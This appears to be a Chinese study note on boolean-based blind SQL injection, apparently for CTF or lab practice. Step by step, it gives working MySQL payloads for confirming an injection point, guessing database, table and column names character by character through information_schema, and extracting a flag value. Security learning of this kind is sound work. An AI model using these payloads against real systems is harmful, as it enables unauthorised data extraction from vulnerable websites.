[知识来源](https://blog.csdn.net/weixin_40709439/article/details/81355856)
**步骤：**

[TOC]

## 1. 查看是否存在注入点

```
?id=1 返回ok
?id=1' 无返回
?id=1 union select 1,2,3
```

则存在注入点，且是三个字段

也可以通过burp查看成功或者失败时的返回的content-length，来判断。

这里需要一些[分流]([一篇文章带你深入理解 SQL 盲注 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/170626#h2-13))的思想。最常见的是if语句，这个时候就可以将注入语句放到expr1，需要构造第三个返回值为false（可以用错误的sql查询语句,但是不能用(1=2)这种东西，猜测可能是因为他会直接返回(1=2)->空数组）

> if(expr1,expr2,expr3)
> expr1 的值为 TRUE，则返回值为 expr2 
> expr1 的值为 FALSE，则返回值为 expr3

## 2. 猜解长度

用二分法来猜解快

```
?id=1 and length(database())>10
?id=1 and if(length(database())>10,1,(select 1 union select 2))
```

## 3. 猜解字段名
```
?id=1 and ascii(substr(database(),1,1)) > 114
?id=1 and if(ascii(substr(database(),1,1)) > 114,1,(select 1 union select 2))
```

## 4.猜测数据库中表的数量

```
(select count(table_name) from information_schema.tables where table_schema=database())=5
```

## 5. 猜测表名的长度

```
(select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=1
```

## 6.猜测第一个表的表名

```
ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97
```

## 7. 猜测users表的字段数

```
(select count(column_name) from information_schema.columns where table_name='users')=1
```

## 8. 猜测users表每一列的长度

```
length(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=1
```

## 9. 猜测column的名字

```
ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),1,1))>97
```

## 10. 查找最终内容

```
ascii(substr((select flag from security.flag limit 0,1),1,1))>97
```

## 11. 编写脚本

[bool_injection.py](../python-scripts/bool_injection.py)

